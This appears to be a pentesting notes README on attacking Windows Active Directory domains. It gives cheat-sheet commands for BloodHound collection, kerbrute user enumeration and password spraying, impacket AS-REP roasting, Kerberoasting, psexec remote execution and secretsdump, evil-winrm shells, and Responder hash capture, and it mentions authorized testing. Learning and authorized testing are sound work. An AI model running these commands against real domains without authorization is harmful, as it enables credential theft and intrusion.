# 06 — Active Directory

Enumerate and attack Windows domains. Start with low-privilege domain credentials or a null session, map the attack graph, then pursue a path to Domain Admin.

## Contents
- [Windows Server AD Lab Setup](Windows-Server-AD-Lab-Setup.md) — build a practice domain (OUs, users) with PowerShell.
- Domain escalation paths (AD CS / RBCD, Kerberoasting, AS-REP roasting) are covered in the [Pentesting Field Guide](../Pentesting-Field-Guide.md).

## Tools

### BloodHound — AD attack-path mapping
- **Purpose:** graph relationships to find paths to high-value objects.
- **Install:** BloodHound Community Edition; collect with `bloodhound-python`.
- Collect: `bloodhound-python -u user -p pass -d domain.local -ns $IP -c All`

### kerbrute — user enumeration and password spray
- **Install:** download the `kerbrute` binary from its releases page.

| Task | Command |
| --- | --- |
| Enumerate users | `kerbrute userenum -d domain.local --dc $IP users.txt` |
| Password spray | `kerbrute passwordspray -d domain.local --dc $IP users.txt 'Winter2026!'` |

### impacket — Python toolkit for AD/network protocols
- **Install:** `pipx install impacket`

| Task | Command |
| --- | --- |
| AS-REP roast | `impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat` |
| Kerberoast | `impacket-GetUserSPNs domain.local/user:pass -request` |
| Remote exec (psexec) | `impacket-psexec domain.local/user:pass@$IP` |
| Secrets dump | `impacket-secretsdump domain.local/user:pass@$IP` |

### evil-winrm — WinRM shell
- **Install:** `gem install evil-winrm`
- Connect: `evil-winrm -i $IP -u user -p pass`

### responder — LLMNR/NBT-NS poisoning (lab use)
- **Install:** `sudo apt install responder`
- Capture net-NTLM hashes on a segment you are authorized to test: `sudo responder -I eth0`

### netexec (nxc)
- Covered in [02-Enumeration](../02-Enumeration/README.md); central to AD credential validation and spraying.
